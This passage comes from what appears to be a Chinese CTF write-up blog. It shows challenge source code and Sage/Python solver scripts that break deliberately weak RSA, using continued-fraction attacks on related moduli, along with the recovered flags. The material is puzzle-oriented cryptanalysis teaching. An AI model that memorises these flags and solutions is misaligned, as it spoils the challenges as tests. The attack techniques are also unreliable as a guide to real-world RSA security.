class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">a,b,c,d,e=2**255,2**256</span><br><span class="hljs-string">g=ab+1</span><br><span class="hljs-string">j=ac+1</span><br><span class="hljs-string">t=cd+1</span><br><span class="hljs-string"></span><br><span class="hljs-string">phi=(g-1)(t-1)</span><br><span class="hljs-string">o=((ed-1)//phi)*b+1=kb+1</span><br><span class="hljs-string"></span><br><span class="hljs-string">n1=gt</span><br><span class="hljs-string">n2=jo</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>e = <span class="hljs-number">77493305850606946966866586869701562747566137421194857276849326558383863716599</span><br>n1 = <span class="hljs-number">38214712801044280452242029022307023900010505700133304226967361821658293768459754887223522190673421124166486124464596635967747405359806642464884601455285823454970604600165907209542618963333642882524596571019916658676095313436156240684679902251615046617153094607425987125749225956361360222801251450373042579071</span><br>n2 = <span class="hljs-number">11918534754165556595562303500191427316052163288557481525821438608864207524482981704928088272082867228651327063972728644192877335261376841505970220897803876176646736511250339814035116162036800063521023303060582016775080988747746487028664050144843952770605999675734459531886474293242344088869877433555271258269</span><br>enc1 = <span class="hljs-number">15808757304442558489652709164051631267713593320560967145595438513675108079906680505924179038743563463272753097766933667737349956243897214853643343110837736923623483907392474855188388096345292952323482631367759757699216716624973244377786699291503949070419765404840454938181818882998235566160193218211345167102</span><br>enc2 = <span class="hljs-number">6376686158682997059741103218078544724010800198504747162290763103690338182777916072489234933936183210135919268370502287963945937266836059808775864844630371956704383598114953698187649635431791980376016420776898290168916806683089572655387949425292390749405301644222442142567586889975355029412203353803624681004</span><br><br>cf = continued_fraction(n2 / n1)<br>convers = cf.convergents()<br><span class="hljs-keyword">for</span> pkd <span class="hljs-keyword">in</span> convers:<br>    k,r3=pkd.as_integer_ratio()<br>    <span class="hljs-keyword">if</span> gcd(k, e) != <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">continue</span><br>    r = inverse_mod(-k, e)<br>    phi = crt([r, <span class="hljs-number">0</span>], [e, r3])<br>    md = e*r3 // gcd(e, r3)<br>    st = phi + (n1//md) * md <span class="hljs-comment">#预处理一下</span><br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">100</span>, <span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">if</span> gcd(e, st+i*md) != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        d = inverse_mod(e, st + i*md)<br>        m = long_to_bytes(power_mod(enc1, d, n1))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> m:<br>            <span class="hljs-built_in">print</span>(phi)<br>            <span class="hljs-built_in">print</span>(m)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#b&#x27;flag&#123;C0ngra4u1ation!!!_You_R3a1ly_Kn0w_Lat2ic3&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;C0ngra4u1ation!!!_You_R3a1ly_Kn0w_Lat2ic3&#125;</span><br></code></pre></td></tr></table></figure><h1 id="湖湘杯-2021signin"><a class="markdownIt-Anchor" href="#湖湘杯-2021signin"></a> [湖湘杯 2021]signin</h1><h2 id="题目-7"><a class="markdownIt-Anchor" href="#题目-7"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> random<br><br>m1 = bytes_to_long(flag[:<span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">2</span>])<br>m2 = bytes_to_long(flag[<span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">2</span>:])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen</span>(<span class="hljs-params">pbits, qbits</span>):<br>    p1, q1 = getPrime(pbits), getPrime(qbits)<br>    n1 = p1**<span class="hljs-number">4</span>*q1<br>    q2 = getPrime(qbits)<br>    bound = p1 // (<span class="hljs-number">8</span>*q1*q2) + <span class="hljs-number">1</span><br>    p2 = random.randrange(p1, p1 + bound)<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(p2):<br>        p2 = random.randrange(p1, p1 + bound)<br>    n2 = p2**<span class="hljs-number">4</span>*q2<br>    <span class="hljs-keyword">return</span> (n1, n2), (p1, q1), (p2, q2)<br><br>e = <span class="hljs-number">0x10001</span><br>pbits = <span class="hljs-built_in">int</span>(<span class="hljs-number">360</span>)<br>qbits = <span class="hljs-built_in">int</span>(<span class="hljs-number">128</span>)<br>pk, sk1, sk2 = gen(pbits, qbits)<br>c1 = <span class="hljs-built_in">pow</span>(m1, e, pk[<span class="hljs-number">0</span>])<br>c2 = <span class="hljs-built_in">pow</span>(m2, e, pk[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;pk = <span class="hljs-subst">&#123;pk&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c1, c2 = <span class="hljs-subst">&#123;c1, c2&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">pk = (1150398070565459492080597718626032792435556703413923483458704675295997646493249759818468321328556510074044954676615760446708253531839417036997811506222349194302791943489195718713797322878586379546657275419261647635859989280700191441312691274285176619391539387875252135478424580680264554294179123254566796890998243909286508189826458854346825493157697201495100628216832191035903848391447704849808577310612723700318670466035077202673373956324725108350230357879374234418393233, 1242678737076048096780023147702514112272319497423818488193557934695583793070332178723043194823444815153743889740338870676093799728875725651036060313223096288606947708155579060628807516053981975820338028456770109640111153719903207363617099371353910243497871090334898522942934052035102902892149792570965804205461900841595290667647854346905445201396273291648968142608158533514391348407631818144116768794595226974831093526512117505486679153727123796834305088741279455621586989)</span><br><span class="hljs-string">c1, c2 = (361624030197288323178211941746074961985876772079713896964822566468795093475887773853629454653096485450671233584616088768705417987527877166166213574572987732852155320225332020636386698169212072312758052524652761304795529199864805108000796457423822443871436659548626629448170698048984709740274043050729249408577243328282313593461300703078854044587993248807613713896590402657788194264718603549894361488507629356532718775278399264279359256975688280723740017979438505001819438, 33322989148902718763644384246610630825314206644879155585369541624158380990667828419255828083639294898100922608833810585530801931417726134558845725168047585271855248605561256531342703212030641555260907310067120102069499927711242804407691706542428236208695153618955781372741765233319988193384708525251620506966304554054884590718068210659709406626033891748214407992041364462525367373648910810036622684929049996166651416565651803952838857960054689875755131784246099270581394)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="分析-7"><a class="markdownIt-Anchor" href="#分析-7"></a> 分析</h2><blockquote><p>连分数原理不太懂‘</p><p>xenny师傅说看到这种多因子+大数都可以考虑连分数分解</p></blockquote><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>n</mi><mn>1</mn></msub><mo>=</mo><msubsup><mi>p</mi><mn>1</mn><mn>4</mn></msubsup><mo>∗</mo><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">n_1=p_1^4*q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>n</mi><mn>2</mn></msub><mo>=</mo><msubsup><mi>p</mi><mn>2</mn><mn>4</mn></msubsup><mo>∗</mo><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">n_2=p_2^4*q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">p_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>略大于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">p_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>有：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><msub><mi>n</mi><mn>1</mn></msub><msub><mi>n</mi><mn>2</mn></msub></mfrac><mo>≈</mo><mfrac><mrow><msubsup><mi>p</mi><mn>1</mn><mn>4</mn></msubsup><mo>∗</mo><msub><mi>q</mi><mn>1</mn></msub></mrow><mrow><msubsup><mi>p</mi><mn>2</mn><mn>4</mn></msubsup><mo>∗</mo><msub><mi>q</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{n_1}{n_2}≈\frac{p_1^4*q_1}{p_2^4*q_2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.94356em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.443416em;vertical-align:-0.9523079999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4911079999999999em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959080000000001em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9523079999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>利用连分数可以求解<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mn>1</mn><mtext>和</mtext><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q1和q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">1</span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><h2 id="exp-7"><a class="markdownIt-Anchor" href="#exp-7"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>pk = (<span class="hljs-number">1150398070565459492080597718626032792435556703413923483458704675295997646493249759818468321328556510074044954676615760446708253531839417036997811506222349194302791943489195718713797322878586379546657275419261647635859989280700191441312691274285176619391539387875252135478424580680264554294179123254566796890998243909286508189826458854346825493157697201495100628216832191035903848391447704849808577310612723700318670466035077202673373956324725108350230357879374234418393233</span>, <span class="hljs-number">1242678737076048096780023147702514112272319497423818488193557934695583793070332178723043194823444815153743889740338870676093799728875725651036060313223096288606947708155579060628807516053981975820338028456770109640111153719903207363617099371353910243497871090334898522942934052035102902892149792570965804205461900841595290667647854346905445201396273291648968142608158533514391348407631818144116768794595226974831093526512117505486679153727123796834305088741279455621586989</span>)<br>c1, c2 = (<span class="hljs-number">361624030197288323178211941746074961985876772079713896964822566468795093475887773853629454653096485450671233584616088768705417987527877166166213574572987732852155320225332020636386698169212072312758052524652761304795529199864805108000796457423822443871436659548626629448170698048984709740274043050729249408577243328282313593461300703078854044587993248807613713896590402657788194264718603549894361488507629356532718775278399264279359256975688280723740017979438505001819438</span>, <span class="hljs-number">33322989148902718763644384246610630825314206644879155585369541624158380990667828419255828083639294898100922608833810585530801931417726134558845725168047585271855248605561256531342703212030641555260907310067120102069499927711242804407691706542428236208695153618955781372741765233319988193384708525251620506966304554054884590718068210659709406626033891748214407992041364462525367373648910810036622684929049996166651416565651803952838857960054689875755131784246099270581394</span>)<br>e = <span class="hljs-number">0x10001</span><br>n1=pk[<span class="hljs-number">0</span>]<br>n2=pk[<span class="hljs-number">1</span>]<br>cf = continued_fraction(n1 / n2)<br>convers = cf.convergents()<br><span class="hljs-keyword">for</span> pkd <span class="hljs-keyword">in</span> convers:<br>    q1,q2=pkd.as_integer_ratio()<br>    <span class="hljs-keyword">if</span> q1==<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> q2==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n1 % q1 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> n2 % q2 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> is_prime(q1) <span class="hljs-keyword">and</span> is_prime(q2):<br>        <span class="hljs-keyword">if</span> iroot(n1//q1, <span class="hljs-number">4</span>)[<span class="hljs-number">1</span>]:<br>            p1=iroot(n1//q1, <span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]<br>            p2=iroot(n2//q2, <span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]<br>            d1=invert(e,(p1**<span class="hljs-number">4</span>-p1**<span class="hljs-number">3</span>)*(q1-<span class="hljs-number">1</span>))<br>            d2=invert(e,(p2**<span class="hljs-number">4</span>-p2**<span class="hljs-number">3</span>)*(q2-<span class="hljs-number">1</span>))<br>            m1=<span class="hljs-built_in">pow</span>(c1,d1,n1)<br>            m2=<span class="hljs-built_in">pow</span>(c2,d2,n2)<br>            <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m1))+long_to_bytes(<span class="hljs-built_in">int</span>(m2)))<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#b&#x27;flag&#123;8ef333ac-21a7-11ec-80f1-00155d83f114&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;8ef333ac-21a7-11ec-80f1-00155d83f114&#125;</span><br></code></pre></td></tr></table></figure><h1 id="nctf-2019easyrsa"><a class="markdownIt-Anchor" href="#nctf-2019easyrsa"></a> [NCTF 2019]easyRSA</h1><h2 id="题目-8"><a class="markdownIt-Anchor" href="#题目-8"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br>e = <span class="hljs-number">0x1337</span><br>p = <span class="hljs-number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span><br>q = <span class="hljs-number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span><br>n = p * q<br><br><span class="hljs-keyword">assert</span>(flag.startswith(<span class="hljs-string">&#x27;NCTF&#x27;</span>))<br>m = <span class="hljs-built_in">int</span>.from_bytes(flag.encode(), <span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-keyword">assert</span>(m.bit_length() &gt; <span class="hljs-number">1337</span>)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment"># 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span><br></code></pre></td></tr></table></figure><h2 id="分析-8"><a class="markdownIt-Anchor" href="#分析-8"></a> 分析</h2><p>AMM</p><h2 id="exp-8"><a class="markdownIt-Anchor" href="#exp-8"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 